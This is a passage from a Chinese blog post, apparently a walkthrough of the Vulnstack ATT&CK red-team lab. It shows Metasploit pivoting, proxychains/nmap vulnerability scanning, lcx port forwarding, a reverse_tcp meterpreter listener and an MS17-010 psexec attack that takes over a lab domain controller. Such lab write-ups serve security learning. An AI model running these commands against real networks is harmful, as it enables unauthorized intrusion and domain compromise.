get_local_subnets#添加一条路由run autoroute -s 192.168.52.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318173738839.png"></p><p>使用msf的socks4代理模块</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318164436351.png"></p><p>文本编辑器修改<code>etc/proxychains.conf</code>，在最后一行加上socks4代理服务器</p><pre class="line-numbers language-none"><code class="language-none">[ProxyList]socks4 192.168.1.5 1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后我们就可以使用proxychains代理nmap扫描主机</p><h4 id="4-2-4-arp扫描内网主机"><a href="#4-2-4-arp扫描内网主机" class="headerlink" title="4.2.4 arp扫描内网主机"></a>4.2.4 arp扫描内网主机</h4><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318174314595.png"></p><h4 id="4-2-5-内网扫描"><a href="#4-2-5-内网扫描" class="headerlink" title="4.2.5 内网扫描"></a>4.2.5 内网扫描</h4><p>扫描域控开放的端口及存在的相应漏洞</p><pre class="line-numbers language-none"><code class="language-none">proxychains nmap -sT -sV -Pn -p22,80,443,135,445 --script&#x3D;vuln 192.168.52.138<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318184046567.png"></p><p>挂代理访问域控的80端口</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318184117657.png"></p><p>现在我们需要认识到，直接使用proxychains使msf走代理攻击到192.168.52.138，是无法获得meterpreter会话，因此下一步使用lcx进行端口转发接收meterpreter</p><p>win7使用lcx转发</p><p>上传lcx到win7，执行命令对55555进行监听：lcx -tran 55555 192.168.1.5 12345</p><p>(命令解释：通过lcx监听本地5555端口，收到数据后转发到192.168.1.5的12345端口，因此kali需要设置监听12345来接收shell)</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220320094743824.png"></p><p>msf监听12345端口：<br>kali启动终端，输入：msfconsole启动msf</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.1.5set lport 12345run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220320094822558.png"></p><p>proxychains代理msf对域控（192.168.52.138）进行ms17-010攻击</p><p>kali启动终端，输入：proxychains msfconsole启动msf</p><pre class="line-numbers language-none"><code class="language-none">use windows&#x2F;smb&#x2F;ms17_010_psexecset rhosts 192.168.52.138set lhost 192.168.52.143set lport 55555run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击完成kali成功获取到会话</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220320095044892.png"></p><p>至此成功获取到域控</p><p>对于域成员192.168.52.141 我们同样可以使用这种攻击方式，这里就不在演示</p><h2 id="0x05-说明："><a href="#0x05-说明：" class="headerlink" title="0x05 说明："></a>0x05 说明：</h2><p>经过这一次充分认识到自己的不足，还需要多加学习，有些地方自己还是没有完全弄明白，也参考了网络上的一些师傅们的教程，感谢分享。</p><p>​    需要说明的是，获取域控的方式有很多，这里我们是直接利用了主机本身存在的安全漏洞。对于攻击成功以后的痕迹清理等等，都没有涉及到，不足的地方再查漏补缺，后续的系列文章中，我们再不断的学习不同的利用方式。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ATT-amp-CK红队评估实战靶场（一）&quot;&gt;&lt;a href=&quot;#ATT-amp-CK红队评估实战靶场（一）&quot; class=&quot;headerlink&quot; title=&quot;ATT&amp;amp;CK红队评估实战靶场（一）&quot;&gt;&lt;/a&gt;ATT&amp;amp;CK红队评估实战靶场（一）&lt;/</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://hdys0vn.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
